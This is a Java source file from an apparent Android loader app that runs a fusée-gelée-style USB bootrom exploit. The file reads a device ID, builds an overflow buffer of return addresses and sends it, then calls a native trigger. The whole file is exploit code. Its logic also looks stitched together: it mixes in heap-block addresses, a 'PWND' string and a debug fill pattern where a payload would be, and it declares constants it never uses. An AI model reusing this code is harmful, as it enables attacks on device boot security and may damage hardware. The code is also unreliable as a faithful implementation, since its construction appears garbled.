package io.github.davidbuchanan314.nxloader;

/*
 * This exploit is based on fusée gelée: https://github.com/reswitched/fusee-launcher
 */

import android.content.Context;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbEndpoint;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;

public class PrimaryLoader implements USBDevHandler {
    private static final int RCM_PAYLOAD_ADDR = 0x40010000;
    private static final int INTERMEZZO_LOCATION = 0x4001F000;
    private static final int PAYLOAD_LOAD_BLOCK = 0x40020000;
    private static final int MAX_LENGTH = 0x30298;

    // Used to load the 'native-lib' library on startup.
    static {
        System.loadLibrary("native-lib");
    }

    public void handleDevice(Context context, UsbDevice device) {
        Logger.log(context, "[+] Launching primary payload!!!");

        UsbDeviceConnection conn = null;
        UsbInterface intf = null;

        try {
            // Use hardcoded constants only (do not read example files)
            long rcmAddr = T8Constants.RCM_PAYLOAD_ADDR;
            long intermezzoLoc = T8Constants.INTERMEZZO_LOCATION;
            long payloadBlock = T8Constants.PAYLOAD_LOAD_BLOCK;
            int maxLength = T8Constants.MAX_LENGTH;
            int stackEnd = T8Constants.STACK_END;

            Logger.log(context, "[*] Using constants: RCM_PAYLOAD_ADDR=0x" + Long.toHexString(rcmAddr) + " INTERMEZZO_LOCATION=0x" + Long.toHexString(intermezzoLoc) + " PAYLOAD_LOAD_BLOCK=0x" + Long.toHexString(payloadBlock) + " MAX_LENGTH=" + maxLength + " STACK_END=0x" + Integer.toHexString(stackEnd));

            UsbManager mUsbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
            if (mUsbManager == null) {
                Logger.log(context, "[-] UsbManager unavailable");
                return;
            }

            intf = device.getInterface(0);
            if (intf == null) {
                Logger.log(context, "[-] USB interface not found");
                return;
            }

            UsbEndpoint endpoint_in = intf.getEndpoint(0);
            UsbEndpoint endpoint_out = intf.getEndpoint(1);
            if (endpoint_in == null || endpoint_out == null) {
                Logger.log(context, "[-] USB endpoints not available in interface");
                return;
            }

            conn = mUsbManager.openDevice(device);
            if (conn == null) {
                Logger.log(context, "[-] Failed to open USB device connection");
                return;
            }

            Logger.log(context, "[*] USB device connection opened");

            if (!conn.claimInterface(intf, true)) {
                Logger.log(context, "[-] Failed to claim USB interface");
                return;
            }

            Logger.log(context, "[*] Claimed USB interface successfully");

            /* Step 1: Read device ID */
            byte[] deviceID = new byte[16];
            int readBytes = conn.bulkTransfer(endpoint_in, deviceID, deviceID.length, 999);
            Logger.log(context, "[*] bulkTransfer read device ID returned " + readBytes + " bytes");
            if (readBytes != deviceID.length) {
                Logger.log(context, "[-] Failed to read device ID, bailing out :(");
                return;
            }

            Logger.log(context, "[+] Read device ID: " + Utils.bytesToHex(deviceID));

            /* Step 2: Start building payload */
            Logger.log(context, "[*] Building payload buffer");
            ByteBuffer payload = ByteBuffer.allocate(maxLength);
            payload.order(ByteOrder.LITTLE_ENDIAN);

            payload.putInt(maxLength);
            payload.put(new byte[676]);
            Logger.log(context, "[*] Placed payload length and reserved header area");

            for (long i = rcmAddr; i < intermezzoLoc; i += 4) {
                payload.putInt((int) intermezzoLoc);
            }
            Logger.log(context, "[*] Filled stack smash region with intermezzo address");

            for (long blk : T8Constants.HEAP_BLOCKS) {
                payload.putLong(blk);
            }
            Logger.log(context, "[*] Appended " + T8Constants.HEAP_BLOCKS.length + " heap block addresses");

            try {
                byte[] pw = T8Constants.PWND_STR.getBytes("US-ASCII");
                payload.put(pw);
                payload.put((byte) 0x00);
                Logger.log(context, "[*] Appended PWND string to payload");
            } catch (Exception e) {
                Logger.log(context, "[-] Failed to append PWND string: " + e.toString());
            }

            int pad = (int) Math.max(0, Math.min(maxLength, payloadBlock - intermezzoLoc));
            payload.put(new byte[pad]);
            Logger.log(context, "[*] Added " + pad + " bytes of padding to reach payload block");

            int remaining = maxLength - payload.position();
            if (remaining > 0) {
                byte[] trailing = new byte[remaining];
                Arrays.fill(trailing, (byte) 0xAA);
                payload.put(trailing);
                Logger.log(context, "[*] Filled remaining " + remaining + " bytes with debug pattern");
            }

            int unpadded_length = payload.position();
            Logger.log(context, "[*] Total payload prepared: " + unpadded_length + " bytes");
            payload.position(0);

            boolean low_buffer = true;
            byte[] chunk = new byte[0x1000];
            int bytes_sent = 0;
            while (bytes_sent < unpadded_length || low_buffer) {
                int toCopy = Math.min(payload.remaining(), chunk.length);
                if (toCopy > 0) {
                    payload.get(chunk, 0, toCopy);
                }
                if (toCopy < chunk.length) {
                    Arrays.fill(chunk, toCopy, chunk.length, (byte) 0x00);
                }
                int sent = conn.bulkTransfer(endpoint_out, chunk, chunk.length, 999);
                Logger.log(context, "[*] bulkTransfer sent chunk at offset " + bytes_sent + " size=" + chunk.length + " payload_bytes=" + toCopy + " result=" + sent);
                if (sent != chunk.length) {
                    Logger.log(context, "[-] Sending payload failed at offset " + bytes_sent);
                    return;
                }
                bytes_sent += chunk.length;
                low_buffer ^= true;
            }

            Logger.log(context, "[+] Sent " + bytes_sent + " bytes of payload");

            Logger.log(context, "[*] Triggering exploit with fd=" + conn.getFileDescriptor() + " stackEnd=0x" + Integer.toHexString(stackEnd));
            int result = nativeTriggerExploit(conn.getFileDescriptor(), stackEnd);
            Logger.log(context, "[*] nativeTriggerExploit returned " + result);

            switch (result) {
                case 0:
                    Logger.log(context, "[+] Exploit triggered!");
                    break;
                case -1:
                    Logger.log(context, "[-] SUBMITURB failed :(");
                    break;
                case -2:
                    Logger.log(context, "[-] DISCARDURB failed :(");
                    break;
                case -3:
                    Logger.log(context, "[-] REAPURB failed :(");
                    break;
                case -4:
                    Logger.log(context, "[-] Wrong URB reaped :( Maybe that doesn't matter?");
                    break;
                default:
                    Logger.log(context, "[-] Unexpected native trigger result: " + result);
                    break;
            }
        } catch (Exception e) {
            Logger.log(context, "[-] Exception in PrimaryLoader.handleDevice: " + e.toString());
        } finally {
            if (conn != null && intf != null) {
                try {
                    conn.releaseInterface(intf);
                    Logger.log(context, "[*] Released USB interface");
                } catch (Exception e) {
                    Logger.log(context, "[-] Failed to release USB interface: " + e.toString());
                }
            }
            if (conn != null) {
                try {
                    conn.close();
                    Logger.log(context, "[*] Closed USB connection");
                } catch (Exception e) {
                    Logger.log(context, "[-] Failed to close USB connection: " + e.toString());
                }
            }
        }
    }



    /**
     * A native method that is implemented by the 'native-lib' native library,
     * which is packaged with this application.
     */
    public native int nativeTriggerExploit(int fd, int length);
}
